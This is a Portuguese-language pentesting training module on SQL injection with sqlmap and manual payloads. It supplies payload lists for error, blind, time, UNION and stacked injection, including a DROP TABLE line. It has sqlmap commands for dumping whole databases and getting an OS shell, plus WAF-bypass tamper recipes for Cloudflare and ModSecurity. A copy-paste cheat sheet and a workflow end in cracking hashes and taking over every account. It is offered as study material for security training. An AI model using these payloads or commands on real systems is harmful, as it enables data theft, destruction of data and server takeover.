# 💉 02. SQL Injection Avançado — SQLMap + Payloads Manuais

> SQL Injection é a vulnerabilidade mais devastadora. Com ela, você extrai bancos inteiros, assume servidores e destrói a aplicação.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 80min | ⭐⭐⭐ Avançado | `sqlmap, curl, Burp Repeater` |

</div>

---

## 🎓 Por que isso importa?

SQL Injection (SQLi) permite que você **injete código SQL malicioso** em inputs da aplicação para manipular o banco de dados. É o ataque mais antigo, mais comum e mais devastador da web.

**Analogia:** Imagine que você preenche um formulário e a resposta vai direto para o banco de dados. Se você escrever `OR 1=1`, o banco retorna TUDO — porque a aplicação não separou seu dado do comando SQL.

**Impacto real:**
- **Extração completa** de bancos de dados (senhas, dados pessoais, cartões)
- **Autenticação bypass** — acessar sem senha
- **RCE** — executar comandos do SO (em MySQL/MSSQL)
- **Modificação de dados** — alterar/deletar registros
- **Privilege escalation** — assumir controle do banco

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| SQL básico (SELECT, WHERE, UNION) | Sim | Este arquivo explica |
| HTTP basics (GET/POST) | Sim | Módulo 00 |
| Burp Suite (Repeater) | Sim | Arquivo 01 |

---

## 🎯 Quando usar SQLMap

- Quando encontrou parâmetro que aceita input (URL, POST data, headers)
- Para testar **todos os tipos de SQLi** (error, blind, union, time, stacked)
- Para **extrair dados** automaticamente
- Para fazer **bypass de WAF** com tamper scripts
- Para obter **OS shell** em casos extremos

---

## 📋 Flags Principais do SQLMap

| Flag | Descrição | Exemplo |
|------|-----------|---------|
| `-u` | URL com parâmetros | `-u "http://target.com/?id=1"` |
| `--data` | Dados POST | `--data="user=admin&pass=123"` |
| `--cookie` | Cookie de sessão | `--cookie="session=abc123"` |
| `--batch` | Modo automático (sem perguntas) | `--batch` |
| `--level` | Nível de testes (1-5, default 1) | `--level=5` |
| `--risk` | Risco dos testes (1-3, default 1) | `--risk=3` |
| `--technique` | Técnicas específicas | `--technique=BEUST` |
| `-p` | Parâmetro específico | `-p id` |
| `--dbs` | Listar bancos de dados | `--dbs` |
| `--tables` | Listar tabelas | `--tables` |
| `--columns` | Listar colunas | `--columns` |
| `--dump` | Baixar dados | `--dump` |
| `--dump-all` | Dump de todos os bancos | `--dump-all` |
| `--os-shell` | Shell do SO | `--os-shell` |
| `--sql-shell` | Shell SQL | `--sql-shell` |
| `--tamper` | Script de bypass de WAF | `--tamper=space2comment,between` |
| `--random-agent` | User agent aleatório | `--random-agent` |
| `--delay` | Delay entre requests (segundos) | `--delay=1` |
| `--threads` | Threads simultâneas | `--threads=10` |
| `-o` | Output file | `-o result.txt` |
| `-v` | Verbosidade (0-6) | `-v=3` |
| `-t` | Salvar requests em arquivo | `-t requests.txt` |

---

## 📝 Técnicas de SQL Injection

### 1. Error-Based SQLi

O servidor retorna erro de SQL → dados aparecem no erro.

```bash
# Payloads
' OR 1=1--
' UNION SELECT NULL--
' AND 1=CONVERT(int,@@version)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--

# Testar via curl
curl "http://target.com/page?id=1' AND 1=1--"
# Se retornar erro de SQL → error-based SQLi

# SQLMap
sqlmap -u "http://target.com/page?id=1" --technique=E --batch
```

### 2. Boolean-Based Blind

Resposta muda dependendo de TRUE/FALSE, sem erro visível.

```bash
# Testar TRUE vs FALSE
curl "http://target.com/page?id=1 AND 1=1"  # TRUE → resposta normal
curl "http://target.com/page?id=1 AND 1=2"  # FALSE → resposta diferente

# Se as respostas forem diferentes → blind SQLi confirmado

# SQLMap
sqlmap -u "http://target.com/page?id=1" --technique=B --batch
```

### 3. Time-Based Blind

Delay na resposta indica injeção (sem retorno de dados).

```bash
# Testar delay
curl -w "%{time_total}" -o /dev/null "http://target.com/page?id=1 AND SLEEP(5)"
# Se tempo de resposta > 5s → time-based SQLi confirmado

# MySQL
' AND SLEEP(5)--
' AND BENCHMARK(10000000,SHA1('test'))--

# PostgreSQL
'; SELECT pg_sleep(5)--

# MSSQL
'; WAITFOR DELAY '0:0:5'--

# SQLMap
sqlmap -u "http://target.com/page?id=1" --technique=T --batch
```

### 4. UNION-Based

Combina resultados de queries para extrair dados.

```bash
# Descobrir número de colunas
' ORDER BY 1--   # funciona
' ORDER BY 2--   # funciona
' ORDER BY 3--   # erro → 2 colunas

# UNION payload
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2--
' UNION SELECT username,password FROM users--

# SQLMap
sqlmap -u "http://target.com/page?id=1" --technique=U --batch
```

### 5. Stacked Queries

Executa múltiplos statements SQL.

```bash
# Testar
'; SELECT 1--
'; DROP TABLE users--

# SQLMap
sqlmap -u "http://target.com/page?id=1" --technique=S --batch
```

---

## 🛠️ SQLMap — Exemplos Práticos

### Scan Completo

```bash
# Scan básico (todos os tipos)
sqlmap -u "http://target.com/page?id=1" --batch

# Output esperado:
# [*] starting @ 14:30:00
# [INFO] testing connection to the target URL
# [INFO] GET parameter 'id' is vulnerable.
# Type: boolean-based blind
# [...]
# [INFO] the back-end DBMS is MySQL
```

### Extrair Dados

```bash
# Listar bancos
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# Output:
# available databases [5]:
# [*] information_schema
# [*] mysql
# [*] performance_schema
# [*] target_db
# [*] test

# Listar tabelas do banco target_db
sqlmap -u "http://target.com/page?id=1" -D target_db --tables --batch

# Output:
# Database: target_db
# [8 tables]
# +----------------+
# | users          |
# | orders         |
# | products       |
# | sessions       |
# | admin          |
# | payments       |
# | logs           |
# | config         |
# +----------------+

# Listar colunas da tabela users
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --columns --batch

# Output:
# Table: users
# [6 columns]
# +----------+--------------+
# | Column   | Type         |
# +----------+--------------+
# | id       | int          |
# | username | varchar(255) |
# | password | varchar(255) |
# | email    | varchar(255) |
# | role     | varchar(50)  |
# | created  | datetime     |
# +----------+--------------+

# Dump da tabela users
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump --batch

# Output:
# +----+----------+---------------------------------------------+-------------------+-------+---------------------+
# | id | username | password                                    | email             | role  | created             |
# +----+----------+---------------------------------------------+-------------------+-------+---------------------+
# | 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 (md5)    | admin@target.com  | admin | 2024-01-15 10:30:00 |
# | 2  | user1    | 482c811da5d5b4bc6d497ffa98491e38            | user1@email.com   | user  | 2024-01-16 14:20:00 |
# +----+----------+---------------------------------------------+-------------------+-------+---------------------+
```

### POST Request

```bash
# Login form
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --batch

# Cookie de sessão
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123" --batch

# User agent customizado
sqlmap -u "http://target.com/page?id=1" --random-agent --batch
```

### OS Shell

```bash
# Shell do SO (MySQL com root)
sqlmap -u "http://target.com/page?id=1" --os-shell --batch

# Output:
# [INFO] the back-end DBMS is MySQL
# [INFO] fetching server OS shell
# [04:30:00] [INFO] OS shell> id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 🛡️ Bypass de WAF com Tamper Scripts

### Scripts Comuns

| Script | O que faz |
|--------|-----------|
| `space2comment` | Espaço → `/**/` |
| `between` | `>` → `NOT BETWEEN 0 AND` |
| `randomcase` | `SELECT` → `sElEcT` |
| `charencode` | `SELECT` → `%53%45%4C%45%43%54` |
| `equaltolike` | `=` → `LIKE` |
| `greatest` | `>` → `GREATEST(1,2)` |
| `apostrophemask` | `'` → `%EF%BC%87` |
| `space2plus` | Espaço → `+` |
| `halfversionedmorekeywords` | `SELECT` → `/*!SELECT*/` |

### Exemplos de Tamper

```bash
# Espaço para comentário
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment --batch

# Múltiplos tamper
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase --batch

# Para Cloudflare
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase,charencode --batch

# Para ModSecurity
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,equaltolike,randomcase --batch
```

### Payloads Manuais de Bypass

```bash
# Espaço → /**/
'/**/OR/**/1=1--

# Espaço → %20
'%20OR%201=1--

# Case variation
' oR 1=1--

# Inline comment
'/*!UNION*//*!SELECT*/ 1,2,3--

# Duplicate keywords
'UNION SELECT SELECT 1,2--

# Char encoding
' UNION SELECT 0x757365726E616D65--

# MySQL
' /*!50000UNION*/ SELECT 1,2--
```

---

## 📋 Fluxo de Teste SQLi

```
┌─────────────────────────────────────────────────────────┐
│  1. TESTAR MANUALMENTE                                   │
│     - ' OR 1=1--                                         │
│     - ' UNION SELECT NULL--                              │
│     - ' AND SLEEP(5)--                                   │
│     - Confirmar que SQLi existe                           │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  2. SQLMAP SCAN                                          │
│     sqlmap -u "URL" --batch                              │
│     Identificar tipo de SQLi e DBMS                       │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  3. ENUMERAR                                             │
│     --dbs → --tables → --columns                         │
│     Identificar tabelas sensíveis                         │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  4. EXTRAIR                                              │
│     -T users --dump                                      │
│     Quebrar hashes (hashcat, john)                       │
│     Acessar todas as contas                               │
└─────────────────────────┬───────────────────────────────┘
                          ▼
┌─────────────────────────────────────────────────────────┐
│  5. ESCALAR                                              │
│     --os-shell (se MySQL root)                           │
│     --sql-shell (executar queries arbitrárias)            │
│     Read/write files (LOAD_FILE, INTO OUTFILE)           │
└─────────────────────────────────────────────────────────┘
```

---

## ❌ Erros Comuns

| Erro | Solução |
|------|---------|
| "SQLMap não detecta" | Aumentar: `--level=5 --risk=3` |
| "WAF bloqueia" | Usar tamper: `--tamper=space2comment,between` |
| "Timeout" | Aumentar timeout: `--timeout=30` |
| "Muitos falsos positivos` | Testar manualmente antes de confiar |
| "Não consigo shell" | MySQL precisa ser root e ter FILE privilege |

---

## 📋 Cheat Sheet Rápido

### Scan Completo (copiar e colar)

```bash
# Básico
sqlmap -u "http://target.com/page?id=1" --batch

# Agressivo
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --batch

# POST
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --batch

# Com cookie
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123" --batch

# Extrair tudo
sqlmap -u "http://target.com/page?id=1" --dump-all --batch

# Shell
sqlmap -u "http://target.com/page?id=1" --os-shell --batch
```

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | Tópicos | Tempo |
|---|:----------:|:----|:--------|:-----:|
| 1 | PortSwigger | [SQL injection](https://portswigger.net/web-security/sql-injection) | SQLi básico | 15min |
| 2 | PortSwigger | [SQL injection — UNION attack](https://portswigger.net/web-security/sql-injection/union-attacks) | UNION-based | 20min |
| 3 | PortSwigger | [SQL injection — blind](https://portswigger.net/web-security/sql-injection/blind) | Blind SQLi | 20min |
| 4 | PortSwigger | [SQL injection — out-of-band](https://portswigger.net/web-security/sql-injection/out-of-band) | OOB SQLi | 25min |
| 5 | PortSwigger | [SQL injection — filter bypass](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-obsolete-encoding) | WAF bypass | 20min |

---

## 📚 Referências

- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQLMap Documentation](https://sqlmap.org/)
- [HackTricks — SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Testar SQLi manualmente (error, blind, union, time-based)
- [ ] Usar SQLMap para detecção e extração automatizada
- [ ] Enumerar bancos, tabelas e colunas com SQLMap
- [ ] Fazer dump de dados sensíveis
- [ ] Bypass de WAF com tamper scripts
- [ ] Obter OS shell via SQLMap (MySQL root)
- [ ] Usar payloads manuais de bypass
- [ ] Completar todos os labs PortSwigger de SQL Injection
